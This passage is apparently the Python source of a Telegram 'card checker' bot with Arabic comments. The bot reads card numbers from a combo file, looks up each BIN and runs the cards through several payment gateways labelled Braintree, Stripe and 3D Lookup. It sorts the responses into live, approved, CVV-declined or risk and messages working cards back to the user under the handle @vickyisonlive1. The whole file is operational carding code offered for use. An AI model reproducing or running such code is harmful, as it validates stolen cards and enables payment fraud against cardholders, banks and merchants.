        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                for cc in lino:
                    # تحقق من حالة التوقف
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝑩𝑶𝑻 𝑩𝒀 ➜『@vickyisonlive1』')
                        return

                    try:
                        data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
                    except:
                        pass

                    # محاولة استخراج البيانات
                    try:
                        bank = data['bank']['name']
                    except:
                        bank = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country_flag = data['country']['emoji']
                    except:
                        country_flag = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country = data['country']['name']
                    except:
                        country = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        brand = data['scheme']
                    except:
                        brand = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        card_type = data['type']
                    except:
                        card_type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        url = data['bank']['url']
                    except:
                        url = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'

                    start_time = time.time()
                    try:
                        last = str(Tele(cc))
                    except Exception as e:
                        
                        notify_owner(gate)
                        last = "ERROR"
                    if 'risk_threshold' in last:
                        last = 'declined'
                    elif 'Duplicate' in last:
                        last = 'Approved'
                    

                    # بناء الرسائل والخيارات
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 👽 ➜ {last} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• OTP ✅ ➜ [ {live} ] •", callback_data='x')
                    ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 🕷➜ [ {ccnn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
                    risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🕸➜ [ {riskk} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 🌪➜ [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝗢𝙋 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, ccn, risk, cm4, cm5, stop)

                    end_time = time.time()
                    execution_time = end_time - start_time

                    # إرسال الرسالة مع النتائج
                    bot.edit_message_text(chat_id=call.message.chat.id,
                                          message_id=call.message.message_id,
                                          text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
                                          𝘾𝙝𝙚𝙘𝙠 𝘽𝙮『@vickyisonlive1』''', reply_markup=mes)

                    msg = f'''<b> 
                    𝗔ρρяσνє𝗗 ✅
                    [❖] 𝗖𝗖 ⇾<code>{cc}</code>
                    [❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
                    [❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
                    ━━━━━━━━━━━━━━
                    [❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
                    [❖] 𝗕𝗮𝗻𝗸  → {bank}
                    [❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code>
                    ━━━━━━━━━━━━━━
                    Pяσχυ -> [ ℓινє [1XX.XX.8X 🟢] ]
                    [❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
                    ━━━━━━━━━━━━━━
                    𝗕𝗼𝘁 𝗕𝗬 ⇾ 『@vickyisonlive1』</b>'''

                    # فحص النتيجة وإرسال الرسالة المناسبة
                    if 'Nice! New payment method added' in last or 'Payment method successfully added.' in last:
                    	live += 1
                    	bot.send_message(call.from_user.id, msg)
                    elif 'Duplicate card exists in the vault.' in msg:
                    	
                    	live += 1
                    	bot.send_message(call.from_user.id, msg)
                    elif 'risk_threshold' in last:
                        riskk += 1
                    elif 'Card Issuer Declined CVV' in last:
                        ccnn += 1
                        bot.send_message(call.from_user.id, msg)
                    else:
                        dd += 1

                    time.sleep(15)
        except Exception as e:
            print(e)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()
    
    
@bot.callback_query_handler(func=lambda call: call.data == 'bc')
def br_gate(call):
    gate = 'Braintree Charge'
    if not check_gate(gate):
        bot.send_message(call.message.chat.id, f"البوابة {gate} تحت الصيانة.")
        return

    def my_function():
        id = call.from_user.id
        live = ccnn = dd = riskk = 0
        # تحقق من وجود المفتاح في stopuser
        if f'{id}' not in stopuser:
            stopuser[f'{id}'] = {'status': 'start'}

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                for cc in lino:
                    # تحقق من حالة التوقف
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝑩𝑶𝑻 𝑩𝒀 ➜『@vickyisonlive1』')
                        return

                    try:
                        data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
                    except:
                        pass

                    # محاولة استخراج البيانات
                    try:
                        bank = data['bank']['name']
                    except:
                        bank = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country_flag = data['country']['emoji']
                    except:
                        country_flag = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country = data['country']['name']
                    except:
                        country = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        brand = data['scheme']
                    except:
                        brand = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        card_type = data['type']
                    except:
                        card_type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        url = data['bank']['url']
                    except:
                        url = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'

                    start_time = time.time()
                    try:
                        last = str(bc(cc))
                    except Exception as e:
                        
                        notify_owner(gate)
                        last = "ERROR"
                    if 'risk_threshold' in last:
                        last = 'declined'
                    elif 'Duplicate' in last:
                        last = 'Approved'
                    

                    # بناء الرسائل والخيارات
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 👽 ➜ {last} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• OTP ✅ ➜ [ {live} ] •", callback_data='x')
                    ccn = types.InlineKeyboardButton(f"• 𝘾𝘾𝙉 🕷➜ [ {ccnn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
                    risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 🕸➜ [ {riskk} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 🌪➜ [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝗢𝙋 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, ccn, risk, cm4, cm5, stop)

                    end_time = time.time()
                    execution_time = end_time - start_time

                    # إرسال الرسالة مع النتائج
                    bot.edit_message_text(chat_id=call.message.chat.id,
                                          message_id=call.message.message_id,
                                          text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
                                          𝘾𝙝𝙚𝙘𝙠 𝘽𝙮『@vickyisonlive1』''', reply_markup=mes)

                    msg = f'''<b> 
                    𝗔ρρяσνє𝗗 ✅
                    [❖] 𝗖𝗖 ⇾<code>{cc}</code>
                    [❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
                    [❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
                    ━━━━━━━━━━━━━━
                    [❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
                    [❖] 𝗕𝗮𝗻𝗸  → {bank}
                    [❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code>
                    ━━━━━━━━━━━━━━
                    Pяσχυ -> [ ℓινє [1XX.XX.8X 🟢] ]
                    [❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
                    ━━━━━━━━━━━━━━
                    𝗕𝗼𝘁 𝗕𝗬 ⇾ 『@vickyisonlive1』</b>'''

                    # فحص النتيجة وإرسال الرسالة المناسبة
                    if 'Nice! New payment method added' in last or 'Payment method successfully added.' in last:
                    	live += 1
                    	bot.send_message(call.from_user.id, msg)
                    elif 'Duplicate card exists in the vault.' in msg:
                    	
                    	live += 1
                    	bot.send_message(call.from_user.id, msg)
                    elif 'risk_threshold' in last:
                        riskk += 1
                    elif 'Card Issuer Declined CVV' in last:
                        ccnn += 1
                        bot.send_message(call.from_user.id, msg)
                    else:
                        dd += 1

                    time.sleep(15)
        except Exception as e:
            print(e)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()


# دالة الفحص الخاصة بـ 3D Lookup
@bot.callback_query_handler(func=lambda call: call.data == 'dsg')
def dsg_gate(call):
    gate = '3D Lookup'
    if not check_gate(gate):
        bot.send_message(call.message.chat.id, f"البوابة {gate} تحت الصيانة.")
        return

    def my_function():
        id = call.from_user.id
        otp = nonotp = 0

        # تحقق من أن المفتاح موجود في stopuser، وإذا لم يكن موجودًا، قم بإضافته
        if f'{id}' not in stopuser:
            stopuser[f'{id}'] = {'status': 'start'}

        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                for cc in lino:
                    # تحقق من حالة التوقف
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝑩𝑶𝑻 𝑩𝒀 ➜『@vickyisonlive1』')
                        return

                    try:
                        data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
                    except:
                        pass

                    # إضافة المزيد من المحاولات للفحص
                    try:
                        bank = data['bank']['name']
                    except:
                        bank = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country_flag = data['country']['emoji']
                    except:
                        country_flag = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country = data['country']['name']
                    except:
                        country = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        brand = data['scheme']
                    except:
                        brand = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        card_type = data['type']
                    except:
                        card_type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        url = data['bank']['url']
                    except:
                        url = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'

                    start_time = time.time()
                    try:
                        last = str(vbv(cc))
                    except Exception as e:
                        
                        notify_owner(gate)
                      
                        print(e)
                        last = "ERROR"
                    if '3DS Challenge Required ❌' in last:
                        last = '3DS Challenge Required ❌'
                    elif 'authenticate_successful' in last:
                        last = 'Authenticate Successful'

                    # بناء الرسائل والخيارات
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 👽 ➜ {last} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• OTP ✅ ➜ [ {otp} ] •", callback_data='x')
                    risk = types.InlineKeyboardButton(f"• NON OTP 🕸➜ [ {nonotp} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 🌪➜ [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝗢𝙋 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, risk, cm5, stop)

                    end_time = time.time()
                    execution_time = end_time - start_time

                    # إرسال الرسالة مع النتائج
                    bot.edit_message_text(chat_id=call.message.chat.id,
                                          message_id=call.message.message_id,
                                          text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
                                          𝘽𝙤𝙩 𝘽𝙮『@vickyisonlive1』''', reply_markup=mes)

                    
                    msg = f'''<b> 
OTP ✅
[❖] 𝗖𝗖 ⇾<code>{cc}</code>
[❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
[❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
 ━━━━━━━━━━━━━━
 [❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
[❖] 𝗕𝗮𝗻𝗸  → {bank}
 [❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code>
━━━━━━━━━━━━━━
Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
 [❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
                    ━━━━━━━━━━━━━━
 𝗕𝗼𝘁 𝗕𝘆 ⇾『@vickyisonlive1』</b>'''
                    if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
                        nonotp += 1
                        bot.send_message(call.from_user.id, msg)
                    else:
                        otp += 1
                        bot.send_message(call.from_user.id, msg)
                    time.sleep(4)
        except Exception as e:
            print(e)
            
    my_thread = threading.Thread(target=my_function)
    my_thread.start()


# دالة الفحص الخاصة بـ Stripe Auth
@bot.callback_query_handler(func=lambda call: call.data == 'sq')
def sq_gate(call):
    gate = 'Stripe Auth'
    if not check_gate(gate):
        bot.send_message(call.message.chat.id, f"البوابة {gate} تحت الصيانة.")
        return

    def my_function():
        id = call.from_user.id
        live = riskk = ccnn = dd = 0
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                        'status': 'start'
                    }

                for cc in lino:
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝑩𝑶𝑻 𝑩𝒀 ➜『@vickyisonlive1』')
                        return
                    try:
                        data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
                    except:
                        pass

                    try:
                        bank = data['bank']['name']
                    except:
                        bank = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country_flag = data['country']['emoji']
                    except:
                        country_flag = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country = data['country']['name']
                    except:
                        country = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        brand = data['scheme']
                    except:
                        brand = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        card_type = data['type']
                    except:
                        card_type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        url = data['bank']['url']
                    except:
                        url = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'

                    start_time = time.time()
                    try:
                        last = str(st(cc))
                    except Exception as e:
                        
                        notify_owner(gate)
                        print(e)
                        last = "ERROR"
                    if 'risk' in last:
                        last = 'declined'
                    elif 'Duplicate' in last:
                        last = 'Approved'

                    # بناء الرسائل والخيارات
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• 𝗔ρρяσνє𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
                    ccn = types.InlineKeyboardButton(f"• Live 🕷➜ [ {ccnn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
                    risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 ☠️➜ [ {riskk} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 🎖➜ [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, ccn, risk, cm4, cm5, stop)

                    end_time = time.time()
                    execution_time = end_time - start_time

                    # إرسال الرسالة مع النتائج
                    bot.edit_message_text(chat_id=call.message.chat.id,
                                          message_id=call.message.message_id,
                                          text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
                                          𝘽𝙤𝙩 𝘽𝙮『@vickyisonlive1』''', reply_markup=mes)

                    msg = f'''<b> 
                    𝗔ρρяσνє𝗗 ✅
                    [❖] 𝗖𝗖 ⇾<code>{cc}</code>
                    [❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
                    [❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
                    ━━━━━━━━━━━━━━
                    [❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
                    [❖] 𝗕𝗮𝗻𝗸  → {bank}
                    [❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code>
                    ━━━━━━━━━━━━━━
                    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
                    [❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
                    ━━━━━━━━━━━━━━
                    𝗕𝗼𝘁 𝗕𝗬 ⇾『@vickyisonlive1』</b>'''

                    # فحص النتيجة وإرسال الرسالة المناسبة
                    if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
                        live += 1
                        bot.send_message(call.from_user.id, msg)
                    elif 'risk' in last:
                        riskk += 1
                    elif 'Charged' in last:
                        live += 1
                        bot.send_message(call.from_user.id, msg)
                    elif 'CVV' in last:
                        ccnn += 1
                    else:
                        dd += 1
                    time.sleep(15)
        except Exception as e:
            print(e)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()
@bot.callback_query_handler(func=lambda call: call.data == 'sh')
def sq_gate(call):
    gate = 'Stripe Charge'
    if not check_gate(gate):
        bot.send_message(call.message.chat.id, f"البوابة {gate} تحت الصيانة.")
        return

    def my_function():
        id = call.from_user.id
        live = riskk = ccnn = dd = 0
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨...⌛")
        try:
            with open("combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
                try:
                    stopuser[f'{id}']['status'] = 'start'
                except:
                    stopuser[f'{id}'] = {
                        'status': 'start'
                    }

                for cc in lino:
                    if stopuser[f'{id}']['status'] == 'stop':
                        bot.edit_message_text(chat_id=call.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝑩𝑶𝑻 𝑩𝒀 ➜『@vickyisonlive1』')
                        return
                    try:
                        data = requests.get('https://lookup.binlist.net/'+cc[:6]).json()
                    except:
                        pass

                    try:
                        bank = data['bank']['name']
                    except:
                        bank = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country_flag = data['country']['emoji']
                    except:
                        country_flag = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        country = data['country']['name']
                    except:
                        country = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        brand = data['scheme']
                    except:
                        brand = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        card_type = data['type']
                    except:
                        card_type = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'
                    try:
                        url = data['bank']['url']
                    except:
                        url = '𝒖𝒏𝒌𝒏𝒐𝒘𝒏'

                    start_time = time.time()
                    try:
                        last = str(sp(cc))
                    except Exception as e:
                        
                        notify_owner(gate)
                        print(e)
                        last = "ERROR"
                    if 'risk' in last:
                        last = 'declined'
                    elif 'Duplicate' in last:
                        last = 'Approved'

                    # بناء الرسائل والخيارات
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝙎𝙏𝘼𝙏𝙐𝙎 ➜ {last} •", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• 𝗔ρρяσνє𝗗 ✅ ➜ [ {live} ] •", callback_data='x')
                    ccn = types.InlineKeyboardButton(f"• Live 🕷➜ [ {ccnn} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {dd} ] •", callback_data='x')
                    risk = types.InlineKeyboardButton(f"• 𝙍𝙄𝙎𝙆 ☠️➜ [ {riskk} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝙏𝙊𝙏𝘼𝙇 🎖➜ [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(f"[ 𝙎𝙏𝙊𝙋 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, ccn, risk, cm4, cm5, stop)

                    end_time = time.time()
                    execution_time = end_time - start_time

                    # إرسال الرسالة مع النتائج
                    bot.edit_message_text(chat_id=call.message.chat.id,
                                          message_id=call.message.message_id,
                                          text=f'''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 {gate}
                                          𝘽𝙤𝙩 𝘽𝙮『@vickyisonlive1』''', reply_markup=mes)

                    msg = f'''<b> 
                    𝗔ρρяσνє𝗗 ✅
                    [❖] 𝗖𝗖 ⇾<code>{cc}</code>
                    [❖] 𝗚𝗔𝗧𝗘𝗦 ⇾ {gate}
                    [❖] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
                    ━━━━━━━━━━━━━━
                    [❖] 𝗕𝗜𝗡 → <code>{cc[:6]} - {card_type} - {brand}</code>
                    [❖] 𝗕𝗮𝗻𝗸  → {bank}
                    [❖] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → <code>{country} - {country_flag}</code>
                    ━━━━━━━━━━━━━━
                    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
                    [❖] 𝗧𝗶𝗺𝗲 𝗧𝗮𝗸𝗲𝗻 ⇾{"{:.1f}".format(execution_time)} secounds .
                    ━━━━━━━━━━━━━━
                    𝗕𝗼𝘁 𝗕𝗬 ⇾『@vickyisonlive1』</b>'''

                    # فحص النتيجة وإرسال الرسالة المناسبة
                    if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
                        live += 1
                        bot.send_message(call.from_user.id, msg)
                    elif 'risk' in last:
                        riskk += 1
                    elif 'Charged' in last:
                        live += 1
                        bot.send_message(call.from_user.id, msg)
                    elif 'CVV' in last:
                        ccnn += 1
                    else:
                        dd += 1
                    time.sleep(15)
        except Exception as e:
            print(e)
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

            
print("تم تشغيل البوت يا سعود باشا")
while True:
    try:
        bot.polling(non_stop=True, interval=0, timeout=20)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(15) 
